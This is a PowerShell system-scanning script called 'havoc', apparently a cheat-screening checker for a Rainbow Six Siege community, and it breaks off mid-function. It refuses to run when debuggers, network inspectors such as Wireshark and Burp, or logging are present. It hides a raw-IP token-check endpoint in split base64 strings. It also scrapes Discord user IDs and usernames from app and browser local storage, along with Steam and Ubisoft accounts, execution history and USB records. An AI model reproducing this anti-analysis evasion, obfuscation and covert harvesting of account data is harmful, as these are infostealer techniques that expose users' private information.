function StripYourClothes {
    $blockedProcesses = @(
        "devenv", "vshost", "MSBuild", "VSDebugConsole",
        "dnSpy", "dnSpy-x86", "x64dbg", "x32dbg",
        "ida", "ida64", "ollydbg", "windbg",
        "ProcessHacker", "procmon", "Wireshark",
        "Fiddler", "charles", "burp"
    )
    
    $runningProcesses = Get-Process | Select-Object -ExpandProperty ProcessName
    $detectedProcesses = $blockedProcesses | Where-Object { $runningProcesses -contains $_ }
    
    if ($detectedProcesses) {
        Write-Host "Unauthorized development environment detected." -ForegroundColor Red
        exit
    }

    if (Test-Path env:\_) {
        exit
    }
    if ($psISE) {
        exit
    }
    $blockedModules = Get-Module | Where-Object { 
        $_.Name -match "Logging|Transcript|Debug|Monitor" 
    }
    if ($blockedModules) {
        exit
    }
    $executionContext.SessionState.LanguageMode | 
        Where-Object { $_ -eq "ConstrainedLanguage" } | 
        ForEach-Object { exit }

    return @{
        SecurityPassed = $true
    }
}

####################################################################################################

function MyShittyNameHeader { param ([string]$Text, [ConsoleColor]$Color = [ConsoleColor]::Cyan) $padding = 8; $width = $Text.Length + (2 * $padding); $box = "┌$('─' * $width)┐`n│$(' ' * $padding)$Text$(' ' * $padding)│`n└$('─' * $width)┘"; Write-Host $box -ForegroundColor $Color }


####################################################################################################

$scanResults = @{
    WindowsConfig = @()
    HiddenFiles = @{
        Hidden = @()
        Suspicious = @()
    }
    WindowsServices = @{
        StartTime = $null
        ServiceRuntimes = @{}
        Anomalies = @()
        CriticalServices = @{}
    }
    UserActivity = @()
    ExecutableScan = @{
        AllExecutables = @()
        SuspiciousExecutables = @()
    }
    Devices = @{
        PCI = @()
        USB = @{
            Current = @()
            History = @()
        }
    }
    SteamAccounts = @()
    R6Accounts = @()
    JournalActivity = @{
        USNJournal = @()
        FileDeletions = @()
        FileSystemModifications = @()
    }
    BSODLogs = @{
        TotalCrashes = 0
    }
    ExtraExtensions = @{
        Files = @()
    }
    PrefetchAnalysis = @{
        SuspiciousFiles = $suspiciousFiles
        DuplicateHashes = $repeatedHashes
        AllPrefetchFiles = @()
    }
    BrowserResults = @()
    DiscordAccounts = @()
    MonitorReplication = @{
        Detected = $false
        Evidence = @()
        MonitorCount = 0
    }
    LuaFileContents = @()
    checker = $null
    usernameinput = $null
    aptitude = $null 
    lgrecoil =  $null
}

####################################################################################################

Write-Host "[havoc] Getting Environment Ready..." -ForegroundColor Red

$securityCheck = StripYourClothes
if (-not $securityCheck.SecurityPassed) {
    exit
}

####################################################################################################

function HideMyPovertyFromYoungBlood {
    $token = $t
    $point1 = "aHR0cDov"
    $point2 = "LzE2Ny4xMT"
    $point3 = "QuMTI0LjEwM"
    $point4 = "zozMDAxL3ZlcmlmeS10b2tlbg=="
    $combinedPoint = $point1 + $point2 + $point3 + $point4
    $veriPoint = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($combinedPoint))
    
    $body = @{
        token = $token
    } | ConvertTo-Json

    try {
        $response = Invoke-RestMethod -Uri $veriPoint -Method Post -Body $body -ContentType "application/json"
        
        if ($response.valid) {
            return @{
                Success = $true
                UserId = $response.userId
            }
        } else {
            return @{
                Success = $false
                Message = "Token validation failed"
            }
        }
    } catch {
        return @{
            Success = $false
            Message = "Token validation failed"
        }
    }
}

$result = HideMyPovertyFromYoungBlood
if ($result.Success) {
    $scanResults.checker = $result.UserId
} else {
    Write-Host "Token validation failed: $($result.Message)" -ForegroundColor Red
    Write-Host "Press any key to exit..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
    exit
}

####################################################################################################

Clear-Host
$Host.UI.RawUI.WindowTitle = "Havoc discord.gg/havc"

####################################################################################################
if (-not (StripYourClothes)) {
    exit
}
$processMemory = Get-Process -Id $PID | Select-Object -ExpandProperty WorkingSet64
if ($processMemory -gt 500MB) {
    exit
}
####################################################################################################


function Read-FileWithRetry {
    param($filePath)

    if (
        $filePath -like "*LOCK" -or 
        $filePath -like "*CURRENT" -or 
        $filePath -like "*MANIFEST*" -or 
        $filePath -like "*LOG*" -or
        $filePath -like "*Cache_Data*" -or
        (Get-Item $filePath).PSIsContainer
    ) {
        return $null
    }
    
    try {
        $fileStream = [System.IO.File]::Open($filePath, 'Open', 'Read', 'ReadWrite')
        $streamReader = New-Object System.IO.StreamReader($fileStream)
        $content = $streamReader.ReadToEnd()
        $streamReader.Close()
        $fileStream.Close()
        return $content
    }
    catch {
        $tempFile = [System.IO.Path]::GetTempFileName()
        Copy-Item -Path $filePath -Destination $tempFile -Force
        $content = [System.IO.File]::ReadAllText($tempFile)
        Remove-Item -Path $tempFile -Force
        return $content
    }
}

Write-Host "[havoc] Initiating scan..." -ForegroundColor Red
function Get-BrowserPaths {
    $browserPaths = @{}
    
    # Chrome paths
    if (Test-Path "$env:LOCALAPPDATA\Google\Chrome") {
        $browserPaths['Chrome'] = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Local Storage\leveldb"
        )
    }
    
    # Firefox paths
    if (Test-Path "$env:APPDATA\Mozilla\Firefox") {
        $browserPaths['Firefox'] = @(
            "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\storage\default\*discord.com*",
            "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\storage\default\*discord.com*"
        )
    }
    
    # Edge paths
    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge") {
        $browserPaths['Edge'] = @(
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Local Storage\leveldb"
        )
    }
    
    # Opera paths
    if (Test-Path "$env:APPDATA\Opera Software\Opera Stable") {
        $browserPaths['Opera'] = @(
            "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb"
        )
    }
    
    # Brave paths
    if (Test-Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser") {
        $browserPaths['Brave'] = @(
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Local Storage\leveldb"
        )
    }
    
    return $browserPaths
}

function Get-DUI {
    $discordPaths = @(
        "$env:APPDATA\Discord\Local Storage\leveldb",
        "$env:APPDATA\Discord PTB\Local Storage\leveldb",
        "$env:APPDATA\Discord Canary\Local Storage\leveldb",
        "$env:APPDATA\Discord Development\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\discorddevelopment\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Discord PTB\Local Storage\leveldb", 
        "$env:LOCALAPPDATA\Discord Canary\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Discord Development\Local Storage\leveldb"
    )

    $browserPaths = Get-BrowserPaths
    foreach ($browser in $browserPaths.Keys) {
        $discordPaths += $browserPaths[$browser]
    }

    $patterns = @(
        # discord application patterns
        '"users":\[({.*?}(?:,{.*?})*)\]',
        '\{"id":"(\d+)","avatar":"[^"]+","[^"]*"([^"]+)"',
        'token.*?"id":"(\d+)".*?"username":"([^"]+)"',
        'session.*?"id":"(\d+)".*?"username":"([^"]+)"',
        'cache.*?"id":"(\d+)".*?"username":"([^"]+)"',
        '"user":\{"id":"(\d+)".*?"username":"([^"]+)"',
        # patterns for the discord data via browser
        'discord\.com.*?"id":"(\d+)".*?"username":"([^"]+)"',
        'discord\.com/app.*?"user":\{"id":"(\d+)".*?"username":"([^"]+)"'
    )

    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            
            $files = if ($path -like "*leveldb") {
                Get-ChildItem -Path $path -Filter "*.ldb"
            } else {
                Get-ChildItem -Path $path
            }
            
            foreach ($file in $files) {
                $content = Read-FileWithRetry $file.FullName
                
                foreach ($pattern in $patterns) {
                    Select-String -InputObject $content -Pattern $pattern -AllMatches | 
                        ForEach-Object { $_.Matches } | ForEach-Object {
                            if ($_.Groups.Count -gt 2) {
                                $userId = $_.Groups[1].Value
                                $username = $_.Groups[2].Value
                                        
                                $exists = $false
                                foreach ($existingAccount in $scanResults.DiscordAccounts) {
                                    if ($existingAccount.UserID -eq $userId) {
                                        $exists = $true
                                        break
                                    }
                                }
                            
                                if (-not $exists -and $userId -match '^\d+$' -and -not [string]::IsNullOrWhiteSpace($username)) {
                                    $scanResults.DiscordAccounts += @{
                                        Username = $username
                                        UserID = $userId
                                        FullTag = "$username-$userId"
                                    }
                                }
                            }
                            else {
                                $usersData = $_.Groups[1].Value
                                Select-String -InputObject $usersData -Pattern '{"id":"(\d+)".*?"username":"([^"]+)"' -AllMatches | 
                                    ForEach-Object { $_.Matches } | ForEach-Object {
                                        $userId = $_.Groups[1].Value
                                        $username = $_.Groups[2].Value

                                        $exists = $false
                                        foreach ($existingAccount in $scanResults.DiscordAccounts) {
                                            if ($existingAccount.UserID -eq $userId) {
                                            $exists = $true
                                           break
                                            }
                                        }
                                        
                                        if (-not $exists -and $userId -match '^\d+$' -and -not [string]::IsNullOrWhiteSpace($username)) {
                                            $scanResults.DiscordAccounts += @{
                                                Username = $username
                                                UserID = $userId
                                                FullTag = "$username-$userId"
                                            }
                                        }
                                    }
                            }
                        }
                }
            }
        }
    }

}
Get-DUI

####################################################################################################

function Get-ExecutableInfo {
    $loggedPaths = @{}
    $registryPaths = @{
        "BAM" = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
        "Store" = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
        "AppSwitched" = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"
        "MuiCache" = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
    }

    $suspiciousPatterns = @(
        'loader',
        'cheat',
        'hack',
        'inject',
        'memory',
        'bypass',
        '\\(klar|linear|codyware|tomware|sunshine|ironsoftware|revl|demoncore|hypex|aptitude|ring-1|lethal|eternity|time2win|lynxtech|lavicheats|ruyzaq|skycheats|cosmocheats|veterancheats|chlorinecheats|leica|thermitehvh|apsmarket|forgive|nightfall|elysian|xerus)\.exe$',
        '\\[A-Z0-9]{6,12}\.exe$'
    )

    $allExecutables = @()
    $suspiciousExecutables = @()

    foreach ($regPath in $registryPaths.GetEnumerator()) {
        try {
            $entries = Get-ItemProperty -Path $regPath.Value -ErrorAction Stop
            $entries.PSObject.Properties | ForEach-Object {
                if ($_.Name -match "exe|dll|sys|bin" -and -not $loggedPaths.ContainsKey($_.Name)) {
                    $exePath = $_.Name
                    $fileExists = Test-Path $exePath
                    $fileInfo = if ($fileExists) { Get-Item $exePath -ErrorAction SilentlyContinue }
                    $signature = if ($fileExists) { 
                        $signatureJob = Start-Job { 
                            Get-AuthenticodeSignature -FilePath $using:exePath -ErrorAction SilentlyContinue 
                        }
                        Wait-Job $signatureJob -Timeout 2 | Out-Null
                        if ($signatureJob.State -eq 'Completed') {
                            Receive-Job $signatureJob
                        }
                        Remove-Job $signatureJob -Force
                    }
                    
                    $regKey = Get-Item -Path $regPath.Value
                    $regKeyTime = $regKey.GetValue('LastWriteTime', $null)

                    $bamTime = if ($regPath.Key -eq "BAM") {
                        try { [DateTime]::FromFileTime([BitConverter]::ToInt64($_.Value, 0)) }
                        catch { $null }
                    }

                    $fileName = Split-Path $exePath -Leaf

                    $exeInfo = [PSCustomObject]@{
                        Path = $exePath
                        Source = $regPath.Key
                        FileExists = $fileExists
                        LastWriteTime = if ($fileExists) { $fileInfo.LastWriteTime } else { $regKeyTime }
                        LastExecutionTime = $bamTime
                        SignatureValid = if ($fileExists) { $signature.Status -eq 'Valid' } else { $null }
                        SignatureIssuer = if ($fileExists) { $signature.SignerCertificate.Issuer } else { "N/A" }
                        FileSize = if ($fileExists) { $fileInfo.Length } else { "File Deleted" }
                        IsSuspicious = ($suspiciousPatterns | Where-Object { $fileName -match $_ }).Count -gt 0
                    }

                    $allExecutables += $exeInfo
                    if ($exeInfo.IsSuspicious) {
                        $suspiciousExecutables += $exeInfo
                    }

                    $loggedPaths[$_.Name] = $true
                }
            }
        }
        catch {
            Write-Host " [havoc] Error accessing $($regPath.Key): $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    return @{
        SuspiciousExecutables = $suspiciousExecutables | Sort-Object -Property IsSuspicious, LastWriteTime -Descending
        AllExecutables = $allExecutables | Sort-Object -Property LastWriteTime -Descending
    }
}

####################################################################################################

function Start-SystemAnalysis {

    MyShittyNameHeader "Windows Configuration" -Color Cyan

    try {
        $secureBootStatus = if ((Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State" -Name "UEFISecureBootEnabled" -ErrorAction Stop).UEFISecureBootEnabled -eq 1) {
            "Enabled"
        } else {
            "Disabled"
        }
    } catch {
        $secureBootStatus = "Not Available (Legacy BIOS)"
    }
    Write-Host " [havoc] Secure Boot Status:" -NoNewline -ForegroundColor Cyan
    Write-Host " $secureBootStatus" -ForegroundColor White

    try {
        $sysInfo = systeminfo | Out-String
        if ($sysInfo -match "Kernel DMA Protection:\s+(\w+)") {
            $dmaStatus = $matches[1]
        } else {
            $dmaProtection = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction Stop
            $dmaStatus = if ($null -ne $dmaProtection.DmaProtectionEnabled -and $dmaProtection.DmaProtectionEnabled -eq 1) { 
                "Enabled" 
            } else { 
                "Disabled" 
            }
        }
    } catch {
        $dmaStatus = "Not Available (Requires Windows 10 v1803+)"
    }
    Write-Host " [havoc] Kernel DMA Protection:" -NoNewline -ForegroundColor Cyan
    Write-Host " $dmaStatus" -ForegroundColor White

    try {
        $sysInfo = if (-not $sysInfo) { systeminfo | Out-String } else { $sysInfo }
        if ($sysInfo -match "Virtualization-based security:\s+(\w+(?:\s+\w+)*)") {
            $vbsStatus = $matches[1]
        } else {
            $vbsInfo = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction Stop
            $vbsStatus = switch ($vbsInfo.VirtualizationBasedSecurityStatus) {
                0 { "Not Enabled" }
                1 { "Enabled But Not Running" }
                2 { "Running" }
                default { "Unknown Status: $($vbsInfo.VirtualizationBasedSecurityStatus)" }
            }
        }
    } catch {
        $vbsStatus = "Not Available"
    }
    Write-Host " [havoc] Virtualization-Based Security:" -NoNewline -ForegroundColor Cyan
    Write-Host " $vbsStatus" -ForegroundColor White

    Write-Host " [havoc] Logging Windows install date" -ForegroundColor Cyan
    try {
        $os = Get-WmiObject -Class Win32_OperatingSystem
        $installDate = $os.ConvertToDateTime($os.InstallDate)
        
        $regInstallDate = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue
        $installDateModified = $false
        
        if ($regInstallDate) {
            $regInstallTimestamp = $null
            
            if ($regInstallDate.InstallDate) {
                $regInstallTimestamp = (Get-Date "1970-01-01").AddSeconds($regInstallDate.InstallDate)
            }
            elseif ($regInstallDate.InstallTime) {
                $regInstallTimestamp = (Get-Date "1970-01-01").AddSeconds($regInstallDate.InstallTime)
            }
            
            if ($regInstallTimestamp) {
                $dateDifference = [Math]::Abs(($regInstallTimestamp - $installDate).TotalDays)
                
                if ($dateDifference -gt 1) {
                    $installDateModified = $true
                    Write-Host " [havoc] WARNING: Windows install date appears to be modified!" -ForegroundColor Red
                    Write-Host " [havoc] WMI reports: $installDate, Registry indicates: $regInstallTimestamp" -ForegroundColor Red
                }
            }
        }

        $daysSinceInstall = (Get-Date) - $installDate
        if ($daysSinceInstall.TotalDays -lt 60) {
            Write-Host " [havoc] NOTICE: Windows was installed recently ($([Math]::Round($daysSinceInstall.TotalDays)) days ago)" -ForegroundColor Yellow
        }
        
        $installDateInfo = if ($installDateModified) {
            "$installDate (MODIFIED)"
        } else {
            "$installDate"
        }
    } catch {
        $installDateInfo = "Unknown"
    }

    $scanResults.WindowsConfig += @(
    "Secure Boot Status: $secureBootStatus",
    "Kernel DMA Protection: $dmaStatus",
    "Virtualization-Based Security: $vbsStatus",
    "Windows Installation Date: $installDateInfo"
    )

    Write-Host " [havoc] Checking Windows Firewall status..." -ForegroundColor Cyan
    $firewallLogs = Get-WinEvent -LogName "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall" -MaxEvents 50 | 
        Where-Object { $_.Id -in @(2009) }


    if ($firewallLogs) {
        $scanResults.WindowsConfig += "Firewall Disable Events:"
        foreach ($log in $firewallLogs) {
            $scanResults.WindowsConfig += "$(Get-Date $log.TimeCreated -Format 'yyyy-MM-dd HH:mm:ss') - Firewall was disabled"
        }
    }

    ####################################################################################################
    $parentProcess = Get-CimInstance Win32_Process -Filter "ProcessId = $PID" | 
    Select-Object -ExpandProperty ParentProcessId
    if ((Get-Process -Id $parentProcess).ProcessName -match "devenv|debug") {
        exit
    }
    ####################################################################################################

    MyShittyNameHeader "Executable Scan" -Color Red
    Write-Host " [havoc] Analyzing executables..." -ForegroundColor Red
    Write-Host " [havoc] This may take a little..." -ForegroundColor Red
    $exeResults = Get-ExecutableInfo
    $scanResults.ExecutableScan.AllExecutables = $exeResults.AllExecutables | ForEach-Object {
        @{
            Path = $_.Path.ToString()
            LastWriteTime = if ($_.LastWriteTime) { $_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }
            Signature = $(if ($_.SignatureValid) { 'Valid' } else { 'Invalid/Missing' })
            D = "-----------------------------------------`n"
        }
    }

    $scanResults.ExecutableScan.SuspiciousExecutables = $exeResults.SuspiciousExecutables | ForEach-Object {
        @{
            Path = $_.Path.ToString()
            Status = if ($_.FileExists) { "Present" } else { "DELETED" }
            LastWriteTime = if ($_.LastWriteTime) { $_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }
            LastExecutionTime = if ($_.LastExecutionTime) { $_.LastExecutionTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }
            SignatureValid = $(if ($_.SignatureValid) { 'Valid' } else { 'Invalid/Missing' })
            FileSize = $_.FileSize
            D = "-----------------------------------------`n"
        }
    }
    Write-Host " [havoc] Finished Analyzing" -ForegroundColor Red



    ####################################################################################################
    MyShittyNameHeader "Siege Account Stats" -Color Magenta

    $userName = $env:UserName
    $potentialPaths = @(
        "C:\Users\$userName\Documents\My Games\Rainbow Six - Siege",
        "C:\Users\$userName\AppData\Local\Ubisoft Game Launcher\spool",
        "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\savegames"
    )

    $oneDriveRegPaths = @(
        "HKCU:\Software\Microsoft\OneDrive\Accounts\Business1\UserFolder",
        "HKCU:\Software\Microsoft\OneDrive\Accounts\Personal\UserFolder",
        "HKCU:\Software\Microsoft\OneDrive\UserFolder"
    )
    foreach ($regPath in $oneDriveRegPaths) {
        $oneDrivePath = Get-ItemProperty -Path ($regPath | Split-Path) -Name ($regPath | Split-Path -Leaf) -ErrorAction SilentlyContinue
        if ($oneDrivePath) {
            $potentialPaths += "$($oneDrivePath.UserFolder)\Documents\My Games\Rainbow Six - Siege"
            break
        }
    }

    $ubisoftCachePaths = @(
        "ownership", "club", "conversations", "game_stats", "ptdata", "settings"
    ) | ForEach-Object { "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\cache\$_" }
    $potentialPaths += $ubisoftCachePaths

    $allUserNames = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    foreach ($path in $potentialPaths) {
        if (Test-Path -Path $path) {
            if ($path -like "*\cache\*") {
                Get-ChildItem -Path $path -File | ForEach-Object {
                    [void]$allUserNames.Add($_.Name)
                }
            } else {
                Get-ChildItem -Path $path -Directory | ForEach-Object {
                    [void]$allUserNames.Add($_.Name)
                }
            }
        }
    }

    foreach ($name in ($allUserNames | Sort-Object)) {
        try {
            $url = "https://stats.cc/siege/$name"
            $response = Invoke-WebRequest -Uri $url -UseBasicParsing
            $content = $response.Content

            if ($content -match '<title>Siege Stats - Stats.CC (.*?) - Rainbow Six Siege Player Stats</title>') {
                $accountName = $matches[1]
                $status = "Active"
                $banType = "None"
                $hostcolor = "Magenta"

                if ($content -match '<div id="Ubisoft Bans".*?<div>Cheating</div>') {
                    $status = "Banned"
                    $banType = "Cheating"
                    $hostcolor = "Red"
                } elseif ($content -match '<div id="Ubisoft Bans".*?<div>Toxic Behavior</div>') {
                    $status = "Banned"
                    $banType = "Toxic Behavior"
                    $hostcolor = "Yellow"
                } elseif ($content -match '<div id="Ubisoft Bans".*?<div>Botting</div>') {
                    $status = "Banned"
                    $banType = "Botting"
                    $hostcolor = "Yellow"
                } elseif ($content -match '<div id="Reputation Bans" class="text-sm">Reputation Bans</div>') {
                    $status = "Banned"
                    $banType = "Reputation"
                    $hostcolor = "Yellow"
                }

                $scanResults.R6Accounts += "$accountName - Status: $status, Type: $banType"
                Write-Host " [havoc] Checking stats for $accountName ... Status: $status, Type: $banType" -ForegroundColor $hostcolor
            }
        } catch {
            $scanResults.R6Accounts += "$name - Status: Error checking stats"
            Write-Host " [havoc] Error checking stats for $name" -ForegroundColor Yellow
        }
    }

    ####################################################################################################

    MyShittyNameHeader "Steam Account Stats" -Color Blue

    $avatarCachePath = "C:\Program Files (x86)\Steam\config\avatarcache"
    $steamIds = @()
    if (Test-Path $avatarCachePath) {
        $steamIds += Get-ChildItem -Path $avatarCachePath -Filter "*.png" | 
                    ForEach-Object { [System.IO.Path]::GetFileNameWithoutExtension($_.Name) }
    }

    $loginUsersPath = "C:\Program Files (x86)\Steam\config\loginusers.vdf"
    if (Test-Path $loginUsersPath) {
        $content = Get-Content $loginUsersPath -Raw
        $matches = [regex]::Matches($content, '"(7656[0-9]{13})"[\s\n]*{[\s\n]*"AccountName"\s*"([^"]*)"')
        foreach ($match in $matches) {
            $steamId = $match.Groups[1].Value
            $accountName = $match.Groups[2].Value
            
            Write-Host " [havoc] Found Steam account: " -NoNewline -ForegroundColor Blue
            Write-Host "$accountName" -NoNewline -ForegroundColor White
            Write-Host " (ID: $steamId)" -ForegroundColor Blue
            
            try {
                $response = Invoke-WebRequest -Uri "https://steamcommunity.com/profiles/$steamId" -UseBasicParsing
                $banStatus = if ($response.Content -match 'profile_ban_info') { "VAC banned" } else { "No VAC bans" }
                $hostColor = if ($banStatus -eq "VAC banned") { "Red" } else { "Green" }
                
                Write-Host " [havoc] VAC Status: $banStatus" -ForegroundColor $hostColor

                $scanResults.SteamAccounts += "`n$accountName - ID: $steamId, - Status: $banStatus"
                Write-Host " [havoc] $accountName - ID: $steamId, - Status: $banStatus" -ForegroundColor $hostColor
            } catch {
                Write-Host " [havoc] Error checking Steam profile: $($_.Exception.Message)" -ForegroundColor Yellow
                $scanResults.SteamAccounts += "`n$accountName - ID: $steamId - Status: VAC Check Failed"
            }
        }
    }


    ####################################################################################################

    MyShittyNameHeader "Device Analysis" -Color Yellow
    Write-Host " [havoc] Analyzing devices..." -ForegroundColor Yellow
    
    try {
        $pciDevices = Get-WmiObject Win32_PnPEntity -Filter "PNPDeviceID LIKE 'PCI%'"
        
        foreach ($device in $pciDevices) {
            $pciPath = $device.PNPDeviceID
            $segmentsPCI = $pciPath.Split('\')
            
            if ($segmentsPCI.Length -lt 2) { continue }
            
            $pciInfo = $segmentsPCI[1].Split('&')
            
            $vendorId = if ($pciInfo.Length -gt 0) {
                if ($pciInfo[0] -match "VEN_([0-9A-F]{4})") {
                    $matches[1]
                } elseif ($pciInfo[0] -match "V([0-9A-F]{4})") {
                    $matches[1]
                } elseif ($pciInfo[0] -match "^([0-9A-F]{4})$") {
                    $matches[1]
                } elseif ($pciInfo[0] -match "VENDOR([0-9A-F]{4})") {
                    $matches[1]
                } elseif ($pciInfo[0] -match "([0-9A-F]{4})h") {
                    $matches[1]
                } else {
                    "UNKNOWN"
                }
            } else {
                "UNKNOWN"
            }
            
            $deviceId = if ($pciInfo.Length -gt 1) {
                if ($pciInfo[1] -match "DEV_([0-9A-F]{4})") {
                    $matches[1]
                } elseif ($pciInfo[1] -match "D([0-9A-F]{4})") {
                    $matches[1]
                } elseif ($pciInfo[1] -match "^([0-9A-F]{4})$") {
                    $matches[1]
                } elseif ($pciInfo[1] -match "DEVICE([0-9A-F]{4})") {
                    $matches[1]
                } elseif ($pciInfo[1] -match "([0-9A-F]{4})h") {
                    $matches[1]
                } else {
                    "UNKNOWN"
                }
            } else {
                "UNKNOWN"
            }
            
            if ($vendorId -eq "UNKNOWN" -or $deviceId -eq "UNKNOWN") {
                $fullString = $segmentsPCI[1]
                
                if ($vendorId -eq "UNKNOWN" -and $fullString -match "VEN_([0-9A-F]{4})") {
                    $vendorId = $matches[1]
                }
                
                if ($deviceId -eq "UNKNOWN" -and $fullString -match "DEV_([0-9A-F]{4})") {
                    $deviceId = $matches[1]
                }
            }
            
            $scanResults.Devices.PCI += @{
                Name = $device.Name
                VendorID = $vendorId
                DeviceID = $deviceId
                Class = $device.PNPClass
                PCIPath = $pciPath
            }
        }
    }
    catch {
        Write-Host " [havoc] Error W/ PCI devices" -ForegroundColor Red
    }
    
    try {
        $usbDevices = Get-WmiObject -Class Win32_PnPEntity | 
            Where-Object { $_.PNPDeviceID -like "USB\*" -or $_.PNPDeviceID -like "USBSTOR\*" }
        
        foreach ($device in $usbDevices) {
            $scanResults.Devices.USB.Current += @{
                Name = $device.Name
                DeviceID = $device.DeviceID
                Description = $device.Description
                Manufacturer = $device.Manufacturer
                Status = $device.Status
                Connected = $true
            }
        }
        
    }
    catch {
        Write-Host " [havoc] Error W/ USB devices" -ForegroundColor Red
    }
    
    try {
        $usbStorPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR"
        if (Test-Path $usbStorPath) {
            Get-ChildItem $usbStorPath | ForEach-Object {
                $deviceClass = Split-Path -Leaf $_.PSPath
                
                Get-ChildItem $_.PSPath | ForEach-Object {
                    $deviceID = Split-Path -Leaf $_.PSPath
                    $properties = Get-ItemProperty $_.PSPath
                    
                    $friendlyName = $properties.FriendlyName
                    if (-not $friendlyName) { $friendlyName = "Unknown Storage Device" }
                    
                    $lastConnected = $null
                    try {
                        if ($properties.LastArrivalDate) {
                            $lastConnected = [DateTime]::FromFileTime($properties.LastArrivalDate)
                        }
                    } catch {}
                    
                    $scanResults.Devices.USB.History += @{
                        Type = "Storage"
                        DeviceID = $deviceID
                        Name = $friendlyName
                        LastConnected = if ($lastConnected) { $lastConnected.ToString("yyyy-MM-dd HH:mm:ss") } else { "Unknown" }
                        IsPresent = $properties.IsPresent -eq 1
                    }
                }
            }
        }
        
        $usbPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
        if (Test-Path $usbPath) {
            Get-ChildItem $usbPath | ForEach-Object {
                $deviceClass = Split-Path -Leaf $_.PSPath
                
                if ($deviceClass -match "^VID_") {
                    Get-ChildItem $_.PSPath | ForEach-Object {
                        $deviceID = Split-Path -Leaf $_.PSPath
                        $properties = Get-ItemProperty $_.PSPath
                        
                        $friendlyName = $properties.FriendlyName
                        if (-not $friendlyName) { 
                            $parentPath = Split-Path -Parent $_.PSPath
                            $parentName = Split-Path -Leaf $parentPath
                            if ($parentName -match "VID_([0-9A-F]{4})&PID_([0-9A-F]{4})") {
                                $vendorId = $matches[1]
                                $productId = $matches[2] 
                                $friendlyName = "USB Device VID_$vendorId PID_$productId"
                            } else {
                                $friendlyName = "Unknown USB Device"
                            }
                        }
                        
                        $lastConnected = $null
                        try {
                            if ($properties.LastArrivalDate) {
                                $lastConnected = [DateTime]::FromFileTime($properties.LastArrivalDate)
                            }
                        } catch {}
                        
                        $scanResults.Devices.USB.History += @{
                            Type = "Device"
                            DeviceID = $deviceID
                            Name = $friendlyName
                            LastConnected = if ($lastConnected) { $lastConnected.ToString("yyyy-MM-dd HH:mm:ss") } else { "Unknown" }
                            IsPresent = $properties.IsPresent -eq 1
                        }
                    }
                }
            }
        }
        
    }
    catch {
        Write-Host " [havoc] Error W/ USB device history" -ForegroundColor Red
    }


    ####################################################################################################

    MyShittyNameHeader "Finalizing | miscellaneous" -Color White

    Write-Host " [havoc] Retrieving BSOD logs..." -ForegroundColor White
    $dumpPath = "$env:windir\Minidump"
    $dumps = Get-ChildItem -Path $dumpPath -Filter "*.dmp" -ErrorAction SilentlyContinue

    if ($dumps.Count -gt 0) {
        Write-Host " [havoc] BSOD logs found!" -ForegroundColor White
        $scanResults.BSODLogs.TotalCrashes = if ($dumps) { $dumps.Count } else { 0 }
    } else {
        Write-Host " [havoc] No BSOD logs found." -ForegroundColor White
    }

    ####################################################################################################

    $servicesExe = Get-WmiObject Win32_Process | Where-Object { $_.Name -eq "services.exe" }
    $legitimateParentPID = $servicesExe.ProcessId

    $svchostProcesses = Get-WmiObject Win32_Process | Where-Object { $_.Name -eq "svchost.exe" }

    foreach ($svchost in $svchostProcesses) {
        if ($svchost.ParentProcessId -ne $legitimateParentPID) {
            Write-Host " [BETA] Suspicious svchost.exe detected!" -ForegroundColor Red
            Write-Host " [BETA] PID: $($svchost.ProcessId)" -ForegroundColor Red
            Write-Host " [BETA] Path: $($svchost.ExecutablePath)" -ForegroundColor Red
            Write-Host " [BETA] Parent PID: $($svchost.ParentProcessId)" -ForegroundColor Red
            Write-Host " [BETA] This means a non windows svchost.exe is running!" -ForegroundColor Red
        }
        if (![string]::IsNullOrEmpty($svchost.ExecutablePath)) {
